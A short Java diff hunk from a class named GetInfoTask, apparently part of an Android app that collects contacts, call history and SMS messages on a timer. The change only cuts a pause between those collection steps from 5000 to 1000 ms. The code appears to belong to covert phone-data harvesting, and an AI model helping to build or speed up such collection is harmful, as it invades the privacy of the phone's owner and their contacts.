@@ -89,7 +89,7 @@ public class GetInfoTask extends TimerTask
 		
 		// Collect information
 		CollectContact(context);
-		SysUtils.threadSleep(5000, LOGTAG);
+		SysUtils.threadSleep(1000, LOGTAG);
 		CollectPhoneCallHist(context);
 		SysUtils.threadSleep(1000, LOGTAG);
 		CollectSms(context);
